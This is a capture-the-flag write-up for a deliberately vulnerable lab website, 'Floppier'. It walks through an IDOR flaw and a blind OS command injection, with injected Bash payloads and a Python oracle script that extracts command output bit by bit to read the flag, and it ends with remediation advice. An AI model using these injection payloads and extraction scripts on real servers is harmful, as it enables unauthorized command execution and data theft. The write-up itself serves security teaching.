# Floppier

Author: Samuele Casarin <862789@stud.unive.it>

## Solution

Floppier is a vulnerable website which provides an online storage service for nostalgic users (each user could upload up to 1.44MB of data, like in old 3.5-inches diskettes).

The website has the following pages:
 - Welcome page, with a brief presentation of the website
 - Register page
 - Login page
 - Floppy page, where the user can:
   - upload a file
   - view the list of his own files
   - download a file
   - delete a file
   - check the usage of his storage space
   - download a CSV file with the file list (this feature is tagged as "BETA", interesting...)

tl;dr: a user could only view his own files... Or this is what they want us to believe!

After registering and logging in, we move into our own floppy page. Obviously, the first thing we try to do is uploading a file.

Then, we take a look at the CSV file generated from the suspicious beta feature "Download file list". It has the following columns:
 - id: the internal ID of the file
 - name: the name of the file
 - type: the MIME type of the file
 - size: the size (in bytes) of the file
 - integrity: the MD5 digest of the file

In no time, we notice that the beta feature "Download file list" allows to download the file list of an arbitrary user by just changing the value of the query parameter "userid".

Since time is money, we write a Python script which does the dirty work for us, by downloading the file lists of all the users up to ours (the initial value of "userid" is the ID of our user profile), with the hope of finding something interesting.

```python
for i in range(1, YOUR_USER_ID):
    url = 'https://floppier.seclab.dais.unive.it/list.php?userid={}' \
        .format(i)
    res = requests.get(url, cookies=cookies)
    print('USER {}'.format(i))
    print(res.text)
```

After some empty file lists, we find the following file list of the user 8:

```
id;name;type;size;integrity
56;secret.txt;text/plain;158;3fe598f69b2272cc424197d1f6fba7c4
```

That "secret.txt" looks tasty! Could we read it?

Moving to the list of our files, we notice that the "Download" link of any file has a query parameter "fileid" and so we try to replace the value with `56` (the ID of the secret file). Unluckily, this time we obtain a response with status code 404. Sad...

Some tries later, we append `; sleep 10`, i.e. we inject a classic Bash command, to the value of the query parameter "fileid" of the link for downloading our file and we observe that the server takes about 10 seconds before responding with an empty file. Thus, we claim that this feature is vulnerable to OS command injection.

Furthermore, we also observe that, if we inject a command which alters the output, such as ` | echo "I'm a potato"`, the server responds with status code 500 and the body `Integrity check failed.`. This allows us to claim that the purpose of the command is not to read the content of the file, but to check the MD5 hash of the file.

Luckily for us, this vulnerability let us to play blind in an easy way!

We write a Python script which prints on our terminal the output of an arbitrary, idempotent command run on the server. Idempotence is required, since the same command has to be executed many times in order to read the whole output, which should not change between different executions (in a short period of time).

First, we design a "Download" link which allows us to ask to the server if a given property is true (expressed as an if condition in Bash). In particular, we inject the command ` | if <property>; then cat; fi`. In this way:
 - if the property is true, the output of the command will be the same as the output of the command without injection and the response will have status code 200;
 - otherwise, the output of the command will be empty and the response will have status code 500.

In a nutshell, we treat the server as an oracle which responds to our questions with "yes" or "no".

```python
def ask_oracle(bash_cond):
    url = 'https://floppier.seclab.dais.unive.it/download.php?fileid={}' \
          ' | if {}; then cat; fi' \
        .format(YOUR_FILE_ID, bash_cond)
    res = requests.get(url, cookies=cookies)
    return res.status_code == 200
```

We can use this oracle in order to exfiltrate the output bit by bit.

To make things faster:
 - we read each byte using a binary search algorithm;
 - we read many bytes at a time (multiprocessing on duty).

```python
def byte_is_lesser_than(cmd, i, x):
    return ask_oracle(
        '[ "$(printf \'%d\\n\' "\'$({} | head -c {} | tail -c 1)")" -lt "{}" ]'
        .format(cmd, i + 1, x)
    )

def read_byte(cmd, i):
    a = 0
    b = 256
    for j in range(0, 8):
        m = (a + b) >> 1
        if byte_is_lesser_than(cmd, i, m):
            b = m
        else:
            a = m
    return a

# ...

def execute(cmd):
    cmd1 = '{} | base64'.format(cmd)

    pool = multiprocessing.Pool(processes=PROCESSES)
    jobs = [
        pool.apply_async(read_byte, args=(cmd1, i,))
        for i in range(read_length(cmd1))
    ]

    return base64.b64decode(bytes([j.get() for j in jobs])).decode('ascii')

print(execute(CMD))
```

Note: we encode the output in base64 to make sure we have the exact bytes.

We execute the script with `CMD = 'ls'` to list the working directory:

```
assets
delete.php
download.php
floppy.php
functions
index.php
list.php
login.php
logout.php
register.php
templates
upload.php
uploads
```

We notice the `uploads` directory, so again we execute the script with `CMD = 'ls uploads/'` to list such directory:

```
100
56
99
```

Finally, we notice a file called `56` (the ID of the secret file), so we execute the script with `CMD = 'cat uploads/56'`:

```
Well done, young Padawan! You've finally mastered the power of OS command injection.
This is the flag, please don't mess up the server :)

flg{ZjpczHt3uEWYnxY4}
```

Here we go, we have the flag. Cheers!

## About security

This challenge focuses on two server-side vulnerabilities:
 - Insecure Direct Object References (IDOR): a web application uses user-supplied input to directly access objects (in this case, the file list of any user);
 - Blind OS command injection: allows the attacker to execute arbitrary OS commands on the server, but the output of the commands is not included within the HTTP responses.

In order to solve these issues, it is necessary to correctly implement access control in the beta feature "Download file list" and to call safe, OS-independent functions to do the same task and/or sanitize the user input.

